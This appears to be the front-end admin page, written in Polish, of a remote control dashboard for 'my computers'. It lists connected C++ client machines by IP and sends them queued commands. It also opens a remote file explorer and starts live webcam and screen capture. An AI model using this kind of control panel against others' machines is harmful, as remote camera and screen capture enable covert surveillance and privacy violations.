"use client";
import { useState, useEffect } from 'react';

export default function AdminPage() {
  const [clients, setClients] = useState<any[]>([]);
  const [msgInput, setMsgInput] = useState<{ [key: string]: string }>({});
  const [activeCameraId, setActiveCameraId] = useState<string | null>(null);
  const [activeScreenId, setActiveScreenId] = useState<string | null>(null);

  const fetchClients = async () => {
    try {
      const res = await fetch('/api/admin');
      const data = await res.json();
      setClients(data.clients || []);
    } catch(e) {}
  };

  useEffect(() => {
    fetchClients();
    const interval = setInterval(fetchClients, 1000);
    return () => clearInterval(interval);
  }, []);

  const sendMessage = async (id: string) => {
    const text = msgInput[id];
    if (!text) return;

    await fetch('/api/admin', {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id, message: text })
    });
    
    setMsgInput(prev => ({ ...prev, [id]: "" }));
    fetchClients();
  };

  const toggleCamera = async (id: string, currentlyCapturing: boolean) => {
    try {
      await fetch('/api/admin', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          id,
          message: currentlyCapturing ? "CAMERA:STOP" : "CAMERA:START"
        })
      });
      setClients(clients.map(c => c.id === id ? { ...c, isCameraActive: !currentlyCapturing } : c));
    } catch (e) {
      console.error(e);
    }
  };

  return (
    <div style={{ minHeight: "100vh", padding: "3rem", background: "linear-gradient(135deg, #0f172a 0%, #172033 100%)", fontFamily: "'Inter', sans-serif" }}>
      <div style={{ maxWidth: "1000px", margin: "0 auto" }}>
        
        <header style={{ marginBottom: "3rem", borderBottom: "1px solid rgba(255,255,255,0.1)", paddingBottom: "1rem" }}>
          <h1 style={{ fontSize: "2.5rem", fontWeight: "800", color: "#e2e8f0", margin: 0, textShadow: "0 2px 10px rgba(0,0,0,0.5)" }}>
            Moje komputery <span style={{ color: "#3b82f6" }}>Live</span>
          </h1>
          <p style={{ color: "#94a3b8", marginTop: "0.5rem", fontSize: "1.1rem" }}>
            Monitoruj aktywne maszyny C++ i wysyłaj do nich zadania (Ping: co minutę)
          </p>
        </header>
        
        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(350px, 1fr))", gap: "1.5rem" }}>
          {clients.length === 0 ? (
            <div style={{ padding: "3rem", gridColumn: "1/-1", background: "rgba(255,255,255,0.03)", borderRadius: "16px", border: "1px solid rgba(255,255,255,0.05)", textAlign: "center" }}>
              <div style={{ display: "inline-block", width: "12px", height: "12px", borderRadius: "50%", backgroundColor: "#ef4444", marginBottom: "1rem", boxShadow: "0 0 10px #ef4444" }}></div>
              <p style={{ color: "#94a3b8", fontSize: "1.2rem", margin: 0 }}>Oczekiwanie na sygnał od jakiegokolwiek komputera...</p>
            </div>
          ) : (
            clients.map(client => (
              <div key={client.id} style={{ 
                background: "rgba(255, 255, 255, 0.05)", 
                backdropFilter: "blur(10px)",
                borderRadius: "16px", 
                border: "1px solid rgba(255,255,255,0.1)", 
                padding: "1.5rem",
                boxShadow: "0 10px 30px rgba(0,0,0,0.2)",
                transition: "transform 0.2s"
              }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1rem" }}>
                  <h3 style={{ margin: 0, color: "#f8fafc", fontSize: "1.4rem" }}>{client.id}</h3>
                  <div style={{ display: "flex", alignItems: "center", gap: "0.5rem" }}>
                    <span style={{ fontSize: "0.85rem", color: "#22c55e", fontWeight: "600" }}>Aktywny</span>
                    <div style={{ width: "10px", height: "10px", borderRadius: "50%", backgroundColor: "#22c55e", boxShadow: "0 0 8px #22c55e" }}></div>
                  </div>
                </div>

                <div style={{ background: "rgba(0,0,0,0.2)", borderRadius: "8px", padding: "1rem", marginBottom: "1.5rem" }}>
                  <p style={{ margin: "0 0 0.5rem 0", color: "#cbd5e1" }}><strong>IP:</strong> <span style={{ color: "#38bdf8" }}>{client.ip}</span></p>
                  <p style={{ margin: 0, color: "#cbd5e1" }}><strong>Ostatni ping:</strong> {new Date(client.lastSeen).toLocaleTimeString()}</p>
                </div>
                
                <div style={{ display: "flex", flexDirection: "column", gap: "0.8rem" }}>
                  <input 
                    type="text" 
                    placeholder="Wpisz komendę np. RESTART"
                    value={msgInput[client.id] || ""}
                    onChange={(e) => setMsgInput({ ...msgInput, [client.id]: e.target.value })}
                    style={{ 
                      padding: "0.8rem 1rem", 
                      borderRadius: "8px", 
                      border: "1px solid rgba(255,255,255,0.1)", 
                      background: "rgba(0,0,0,0.3)", 
                      color: "white",
                      outline: "none",
                      fontSize: "1rem"
                    }}
                  />
                  <button 
                    onClick={() => sendMessage(client.id)}
                    style={{ 
                      padding: "0.8rem", 
                      borderRadius: "8px", 
                      border: "none",
                      background: "linear-gradient(90deg, #3b82f6 0%, #2563eb 100%)",
                      color: "white",
                      fontWeight: "bold",
                      fontSize: "1rem",
                      cursor: "pointer",
                      boxShadow: "0 4px 15px rgba(37, 99, 235, 0.4)",
                      transition: "opacity 0.2s"
                    }}
                    onMouseOver={(e) => e.currentTarget.style.opacity = "0.9"}
                    onMouseOut={(e) => e.currentTarget.style.opacity = "1"}
                  >
                    Wyślij zadanie
                  </button>
                  {client.messages.length > 0 && (
                    <div style={{ marginTop: "0.5rem", padding: "0.5rem", background: "rgba(234, 179, 8, 0.1)", border: "1px solid rgba(234, 179, 8, 0.3)", borderRadius: "6px" }}>
                      <p style={{ color: "#eab308", fontSize: "0.85rem", margin: 0, textAlign: "center" }}>
                        Oczekujące zadania w kolejce: <strong>{client.messages.length}</strong>
                      </p>
                    </div>
                  )}

                  <div style={{ marginTop: "1rem", paddingTop: "1rem", borderTop: "1px solid rgba(255,255,255,0.1)" }}>
                    <h4 style={{ color: "#f8fafc", marginBottom: "0.5rem" }}>Eksplorator Plików</h4>
                    <button 
                        onClick={() => window.location.href = `/explorer/${client.id}`}
                        style={{ 
                          width: "100%",
                          padding: "0.8rem 1rem", 
                          borderRadius: "4px", 
                          border: "none",
                          background: "#10b981",
                          color: "white",
                          fontWeight: "bold",
                          cursor: "pointer",
                          boxShadow: "0 4px 15px rgba(16, 185, 129, 0.4)",
                          transition: "background 0.2s"
                        }}
                        onMouseOver={(e) => e.currentTarget.style.background = "#059669"}
                        onMouseOut={(e) => e.currentTarget.style.background = "#10b981"}
                    >
                        📂 Otwórz Menedżer Plików
                    </button>
                    
                    <button 
                        onClick={() => setActiveCameraId(client.id)}
                        style={{ 
                          width: "100%",
                          marginTop: "10px",
                          padding: "0.8rem 1rem", 
                          borderRadius: "4px", 
                          border: "none",
                          background: "#4f46e5",
                          color: "white",
                          fontWeight: "bold",
                          cursor: "pointer",
                          boxShadow: "0 4px 15px rgba(79, 70, 229, 0.4)",
                          transition: "background 0.2s"
                        }}
                    >
                        📹 Podgląd Kamery
                    </button>
                    
                    <button 
                        onClick={() => setActiveScreenId(client.id)}
                        style={{ 
                          width: "100%",
                          marginTop: "10px",
                          padding: "0.8rem 1rem", 
                          borderRadius: "4px", 
                          border: "none",
                          background: "#9333ea",
                          color: "white",
                          fontWeight: "bold",
                          cursor: "pointer",
                          boxShadow: "0 4px 15px rgba(147, 51, 234, 0.4)",
                          transition: "background 0.2s"
                        }}
                    >
                        🖥️ Podgląd Ekranu
                    </button>
                  </div>
                </div>
              </div>
            ))
          )}
        </div>
      </div>

      {activeCameraId && (() => {
        const camClient = clients.find(c => c.id === activeCameraId);
        if (!camClient) return null;
        
        return (
          <div style={{
            position: "fixed", top: 0, left: 0, width: "100vw", height: "100vh",
            backgroundColor: "rgba(0,0,0,0.85)", zIndex: 9999, display: "flex", justifyContent: "center", alignItems: "center", backdropFilter: "blur(5px)"
          }}>
            <div style={{
              width: "90%", maxWidth: "1000px", backgroundColor: "#1e293b", borderRadius: "12px", overflow: "hidden", 
              boxShadow: "0 25px 50px -12px rgba(0,0,0,0.5)", border: "1px solid rgba(255,255,255,0.1)", color: "#f8fafc"
            }}>
              <div style={{ backgroundColor: "#0f172a", padding: "12px 20px", borderBottom: "1px solid rgba(255,255,255,0.1)", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <span style={{ fontWeight: "bold", fontSize: "16px", color: "#38bdf8" }}>📹 Remote Camera - {camClient.id}</span>
                <button onClick={() => setActiveCameraId(null)} style={{ background: "transparent", border: "none", fontSize: "20px", cursor: "pointer", color: "#94a3b8" }}>✖</button>
              </div>

              <div style={{ display: "flex", padding: "20px", gap: "20px", height: "600px" }}>
                <div style={{ flex: 1, backgroundColor: "#020617", borderRadius: "8px", border: "1px solid rgba(255,255,255,0.05)", position: "relative", display: "flex", alignItems: "center", justifyContent: "center", overflow: "hidden" }}>
                  {camClient.isCameraActive ? (
                    camClient.cameraData ? (
                      <div style={{ width: "100%", height: "100%", display: "flex", flexDirection: "column", alignItems: "center" }}>
                        <img src={`data:image/jpeg;base64,${camClient.cameraData}`} alt="Video Stream" style={{ width: "100%", height: "100%", objectFit: "contain" }} />
                        <div style={{ position: "absolute", bottom: 10, left: 10, fontSize: "11px", color: "#4ade80", background: "rgba(0,0,0,0.6)", padding: "4px 8px", borderRadius: "4px" }}>
                           {Math.round(camClient.cameraData.length / 1024)} KB | {new Date().toLocaleTimeString()}
                        </div>
                      </div>
                    ) : (
                      <div style={{ textAlign: "center" }}>
                        <div style={{ width: "40px", height: "40px", border: "3px solid #38bdf8", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 1s linear infinite", margin: "0 auto 15px auto" }}></div>
                        <span style={{ color: "#94a3b8" }}>Oczekiwanie na klatki...</span>
                      </div>
                    )
                  ) : (
                    <span style={{ color: "#475569" }}>Kamera wyłączona</span>
                  )}
                  {camClient.isCameraActive && (
                    <div style={{ position: "absolute", top: 15, right: 15, backgroundColor: "#ef4444", color: "white", padding: "4px 10px", borderRadius: "4px", fontSize: "11px", fontWeight: "bold", animation: "pulse 2s infinite" }}>● LIVE</div>
                  )}
                </div>

                <div style={{ width: "220px", display: "flex", flexDirection: "column", gap: "15px" }}>
                  <div style={{ background: "rgba(255,255,255,0.03)", padding: "15px", borderRadius: "8px", border: "1px solid rgba(255,255,255,0.05)" }}>
                    <div style={{ fontSize: "13px", color: "#94a3b8", marginBottom: "10px" }}>⚡ Kontrola</div>
                    <button 
                      onClick={() => toggleCamera(camClient.id, camClient.isCameraActive)}
                      style={{ 
                        width: "100%", padding: "10px", marginBottom: "10px", 
                        backgroundColor: camClient.isCameraActive ? "#ef4444" : "#10b981", 
                        color: "white", border: "none", borderRadius: "6px", fontWeight: "bold", cursor: "pointer",
                        transition: "opacity 0.2s"
                      }}
                    >
                      {camClient.isCameraActive ? "⏹ Stop Kamera" : "▶️ Start Kamera"}
                    </button>
                    <div style={{ fontSize: "11px", color: "#64748b", textAlign: "center" }}>
                      Refresh: 1 klatka / sekunda
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        );
      })()}

      {activeScreenId && (() => {
        const scClient = clients.find(c => c.id === activeScreenId);
        if (!scClient) return null;
        
        const toggleScreen = async (id: string, currentlyCapturing: boolean) => {
            try {
              await fetch('/api/admin', {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                      id,
                      message: currentlyCapturing ? "SCREEN:STOP" : "SCREEN:START"
                  })
              });
              setClients(clients.map(c => c.id === id ? { ...c, isScreenActive: !currentlyCapturing } : c));
            } catch (e) {
              console.error(e);
            }
        };

        return (
          <div style={{
            position: "fixed", top: 0, left: 0, width: "100vw", height: "100vh",
            backgroundColor: "rgba(0,0,0,0.85)", zIndex: 9999, display: "flex", justifyContent: "center", alignItems: "center", backdropFilter: "blur(5px)"
          }}>
            <div style={{
              width: "95%", maxWidth: "1200px", backgroundColor: "#1e293b", borderRadius: "12px", overflow: "hidden", 
              boxShadow: "0 25px 50px -12px rgba(0,0,0,0.5)", border: "1px solid rgba(255,255,255,0.1)", color: "#f8fafc"
            }}>
              <div style={{ backgroundColor: "#0f172a", padding: "12px 20px", borderBottom: "1px solid rgba(255,255,255,0.1)", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                <span style={{ fontWeight: "bold", fontSize: "16px", color: "#a855f7" }}>🖥️ Screen Mirroring - {scClient.id}</span>
                <button onClick={() => setActiveScreenId(null)} style={{ background: "transparent", border: "none", fontSize: "20px", cursor: "pointer", color: "#94a3b8" }}>✖</button>
              </div>

              <div style={{ display: "flex", padding: "20px", gap: "20px", height: "700px" }}>
                <div style={{ flex: 1, backgroundColor: "#020617", borderRadius: "8px", border: "1px solid rgba(255,255,255,0.05)", position: "relative", display: "flex", alignItems: "center", justifyContent: "center", overflow: "hidden" }}>
                  {scClient.isScreenActive ? (
                    scClient.screenData ? (
                      <div style={{ width: "100%", height: "100%", display: "flex", flexDirection: "column", alignItems: "center" }}>
                        <img src={`data:image/jpeg;base64,${scClient.screenData}`} alt="Screen Stream" style={{ width: "100%", height: "100%", objectFit: "contain" }} />
                        <div style={{ position: "absolute", bottom: 10, left: 10, fontSize: "11px", color: "#a855f7", background: "rgba(0,0,0,0.6)", padding: "4px 8px", borderRadius: "4px" }}>
                           {Math.round(scClient.screenData.length / 1024)} KB | {new Date().toLocaleTimeString()}
                        </div>
                      </div>
                    ) : (
                      <div style={{ textAlign: "center" }}>
                        <div style={{ width: "40px", height: "40px", border: "3px solid #a855f7", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 1s linear infinite", margin: "0 auto 15px auto" }}></div>
                        <span style={{ color: "#94a3b8" }}>Pobieranie ekranu...</span>
                      </div>
                    )
                  ) : (
                    <span style={{ color: "#475569" }}>Screen Mirroring wyłączony</span>
                  )}
                  {scClient.isScreenActive && (
                    <div style={{ position: "absolute", top: 15, right: 15, backgroundColor: "#a855f7", color: "white", padding: "4px 10px", borderRadius: "4px", fontSize: "11px", fontWeight: "bold", animation: "pulse 2s infinite" }}>● LIVE MONITOR</div>
                  )}
                </div>

                <div style={{ width: "220px", display: "flex", flexDirection: "column", gap: "15px" }}>
                  <div style={{ background: "rgba(255,255,255,0.03)", padding: "15px", borderRadius: "8px", border: "1px solid rgba(255,255,255,0.05)" }}>
                    <div style={{ fontSize: "13px", color: "#94a3b8", marginBottom: "10px" }}>⚡ Kontrola</div>
                    <button 
                      onClick={() => toggleScreen(scClient.id, scClient.isScreenActive)}
                      style={{ 
                        width: "100%", padding: "10px", marginBottom: "10px", 
                        backgroundColor: scClient.isScreenActive ? "#ef4444" : "#9333ea", 
                        color: "white", border: "none", borderRadius: "6px", fontWeight: "bold", cursor: "pointer",
                        transition: "opacity 0.2s"
                      }}
                    >
                      {scClient.isScreenActive ? "⏹ Stop Monitor" : "▶️ Start Monitor"}
                    </button>
                    <div style={{ fontSize: "11px", color: "#64748b", textAlign: "center" }}>
                      Refresh: 1 klatka / sekunda
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        );
      })()}
      
      <style jsx global>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        @keyframes pulse {
          0% { opacity: 1; }
          50% { opacity: 0.6; }
          100% { opacity: 1; }
        }
      `}</style>
    </div>
  );
}
